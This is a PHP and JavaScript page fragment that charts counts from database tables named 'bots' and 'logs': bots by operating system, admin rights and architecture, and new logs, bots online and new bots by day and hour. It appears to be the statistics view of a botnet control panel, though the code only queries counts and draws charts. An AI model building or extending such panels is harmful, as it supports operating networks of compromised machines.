
<script type="text/javascript">
   

	//define chart clolors ( you maybe add more colors if you want or flot will add it automatic )
 	var chartColours = ['#62aeef', '#d8605f', '#72c380', '#6f7a8a', '#f7cb38', '#5a8022', '#2c7282', '#ff7282', '#ffff82', '#000082'];
 	//generate random number for charts
	randNum = function(){
		return (Math.floor( Math.random()* (1+40-20) ) ) + 20;
	}

		////PIE/////
		
			 google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart00);
      function drawChart00() {
	
        var data133 = google.visualization.arrayToDataTable([
		['OS', 'Bots'],
			    <?php
								
				$dataArray  = array();
				$i = 0;
				$sqlObj = mysql_query("SELECT COUNT(*),os from bots GROUP BY os DESC LIMIT 10");
				while($r = mysql_fetch_row($sqlObj))
				{

						$dataArray[] = '["'.$r[1].'",  '.$r[0].']';
										++$i;
				}
				echo implode($dataArray, ",\r\n");
				?>
		
        ]);

        var options = {
          title: "",
		  width:450
        };

        var chart133 = new google.visualization.PieChart(document.getElementById('chart_pie_os'));
        chart133.draw(data133, options);
		
		
		
      }
	  
	  

			
					



		 google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart0000);
      function drawChart0000() {
	
        var data135 = google.visualization.arrayToDataTable([
		['Permissions', 'Bots'],
			    <?php
								
				$dataArray  = array();
				$i = 0;
				$sqlObj = mysql_query("SELECT COUNT(*),user_admin from bots GROUP BY user_admin DESC  ");
				while($r = mysql_fetch_row($sqlObj))
				{

						$dataArray[] = '["'.$r[1].'",  '.$r[0].']';
										++$i;
				}
				echo implode($dataArray, ",\r\n");
				?>
		
        ]);

        var options = {
          title: "",
		  width:450
		  
        };

        var chart135 = new google.visualization.PieChart(document.getElementById('chart_pie_perms'));
        chart135.draw(data135, options);
		
		
		
      }
	  
	  




				


		 google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart000);
      function drawChart000() {
	
        var data134 = google.visualization.arrayToDataTable([
		['Arch', 'Bots'],
			    <?php
								
				$dataArray  = array();
				$i = 0;
				$sqlObj = mysql_query("SELECT COUNT(*),arch from bots GROUP BY arch DESC  ");
				while($r = mysql_fetch_row($sqlObj))
				{

						$dataArray[] = '["'.$r[1].'",  '.$r[0].']';
										++$i;
				}
				echo implode($dataArray, ",\r\n");
				?>
		
        ]);

        var options = {
          title: "",
		  width:450
        };

        var chart134 = new google.visualization.PieChart(document.getElementById('chart_pie_arch'));
        chart134.draw(data134, options);
		
		
		
      }
	  
	  

				
		/*END PIE*/
		
		
		
		
		
	  /* CHART LOGS WEEK*/
   	
	  google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
    
	
	  function drawChart() { 
        var line_logs_week = google.visualization.arrayToDataTable([
        ['Day', 'New logs'],

<?php

$data_content = array();

$timestamp = strtotime('Previous Monday');

for ($i = 0; $i < 7; $i++) {

 $dayname = strftime('%A', $timestamp);

$first= strtotime('this '.$dayname.' 00:00:00', $timestamp);
$end = strtotime('this '.$dayname.' 23:59:59', $timestamp);

$sqlQuery = "SELECT COUNT(*) FROM logs  WHERE( date>=$first AND date<=$end)";

$result = mysql_query($sqlQuery);
$rowSql = mysql_fetch_row($result);
$integer = (int)$rowSql[0];


$data_content[]=  "['$dayname', $integer]";
 $timestamp = strtotime('+1 day', $timestamp);
}

echo implode(",", $data_content);

?>

		
        ]);

        var options = {        title: 'New logs this week by day',  width:700, height:250      };

         new google.visualization.LineChart(document.getElementById('line_logs_week')).draw(line_logs_week, options);
  	
	
      }
	  
	  
	  
	  /* END CHART LOGS WEEK*/
	  
	  /* CHART LOGS TODAY*/
	  
   	
	  google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart2);
    
	
	  function drawChart2() { 
        var line_logs_today = google.visualization.arrayToDataTable([
        ['Hour', 'New logs'],

<?php

$data_content = array();

for ($i = 0; $i < 24; $i++) {

$first= strtotime($i.':00:00');
$end = strtotime($i.':59:59');

$sqlQuery = "SELECT COUNT(*) FROM logs  WHERE( date>=$first AND date<=$end)";

$result = mysql_query($sqlQuery);
$rowSql = mysql_fetch_row($result);
$integer = (int)$rowSql[0];

$hour = $i;

$data_content[]=  "['$hour', $integer]";
}

echo implode(",", $data_content);

?>

		
        ]);

        var options = {        title: 'New logs Today by hour',  width:700, height:250      };

         new google.visualization.LineChart(document.getElementById('line_logs_today')).draw(line_logs_today, options);
  	
	
      }
	  
		
		
	  /* END CHART LOGS TODAY*/
	  
		
	  /* CHART ONLINE WEEK*/
	  
		
   	
	  google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart4);
    
	
	  function drawChart4() { 
        var chart_online_week = google.visualization.arrayToDataTable([
        ['Day', 'Online'],

<?php

$data_content = array();

$timestamp = strtotime('Previous Monday');

for ($i = 0; $i < 7; $i++) {

 $dayname = strftime('%A', $timestamp);

$first= strtotime('this '.$dayname.' 00:00:00', $timestamp);
$end = strtotime('this '.$dayname.' 23:59:59', $timestamp);

$sqlQuery = "SELECT COUNT(*) FROM bots  WHERE( knock_time>=$first AND knock_time<=$end)";

$result = mysql_query($sqlQuery);
$rowSql = mysql_fetch_row($result);
$integer = (int)$rowSql[0];


$data_content[]=  "['$dayname', $integer]";
 $timestamp = strtotime('+1 day', $timestamp);
}

echo implode(",", $data_content);

?>

		
        ]);

        var options = {        title: 'Online by day this week',  width:700, height:250      };

         new google.visualization.LineChart(document.getElementById('chart_online_week')).draw(chart_online_week, options);
  	
	
      }
	  
	  
	  
	  /* END CHART ONLINE WEEK*/
	  
	  
	  
	  /* CHART ONLINE TODAY*/
	  
	  
   	
	  google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart3);
    
	
	  function drawChart3() { 
        var chart_online_today = google.visualization.arrayToDataTable([
        ['Hour', 'Online'],

<?php

$data_content = array();

for ($i = 0; $i < 24; $i++) {

$first= strtotime($i.':00:00');
$end = strtotime($i.':59:59');

$sqlQuery = "SELECT COUNT(*) FROM bots  WHERE( knock_time>=$first AND knock_time<=$end)";

$result = mysql_query($sqlQuery);
$rowSql = mysql_fetch_row($result);
$integer = (int)$rowSql[0];

$hour = $i;

$data_content[]=  "['$hour', $integer]";
}

echo implode(",", $data_content);

?>

		
        ]);

        var options = {        title: 'Online Today by hour',  width:700, height:250      };

         new google.visualization.LineChart(document.getElementById('chart_online_today')).draw(chart_online_today, options);
  	
	
      }
	  
	  
	  
	  
	  /* END CHART ONLINE TODAY*/
	  
	  
	  
	  
	  
	  	
	  /* CHART NEW WEEK*/
	  
		
   	
	  google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart5);
    
	
	  function drawChart5() { 
        var chart_new_week = google.visualization.arrayToDataTable([
        ['Day', 'New'],

<?php

$data_content = array();

$timestamp = strtotime('Previous Monday');

for ($i = 0; $i < 7; $i++) {

 $dayname = strftime('%A', $timestamp);

$first= strtotime('this '.$dayname.' 00:00:00', $timestamp);
$end = strtotime('this '.$dayname.' 23:59:59', $timestamp);

$sqlQuery = "SELECT COUNT(*) FROM bots  WHERE( first_time>=$first AND first_time<=$end)";

$result = mysql_query($sqlQuery);
$rowSql = mysql_fetch_row($result);
$integer = (int)$rowSql[0];


$data_content[]=  "['$dayname', $integer]";
 $timestamp = strtotime('+1 day', $timestamp);
}

echo implode(",", $data_content);

?>

		
        ]);

        var options = {        title: 'New bots this week by day',  width:700, height:250      };

         new google.visualization.LineChart(document.getElementById('chart_new_week')).draw(chart_new_week, options);
  	
	
      }
	  
	  
	  
	  /* END CHART NEW WEEK*/
	  
	  
	  
	  /* CHART NEW TODAY*/
	  
	  
   	
	  google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart6);
    
	
	  function drawChart6() { 
        var chart_new_today = google.visualization.arrayToDataTable([
        ['Hour', 'New'],

<?php

$data_content = array();

for ($i = 0; $i < 24; $i++) {

$first= strtotime($i.':00:00');
$end = strtotime($i.':59:59');

$sqlQuery = "SELECT COUNT(*) FROM bots  WHERE( first_time>=$first AND first_time<=$end)";

$result = mysql_query($sqlQuery);
$rowSql = mysql_fetch_row($result);
$integer = (int)$rowSql[0];

$hour = $i;

$data_content[]=  "['$hour', $integer]";
}

echo implode(",", $data_content);

?>

		
        ]);

        var options = {        title: 'New bots Today by hour',  width:700, height:250      };

         new google.visualization.LineChart(document.getElementById('chart_new_today')).draw(chart_new_today, options);
  	
	
      }
	  
	  
	  
	  
	  /* END CHART NEW TODAY*/
		</script>
		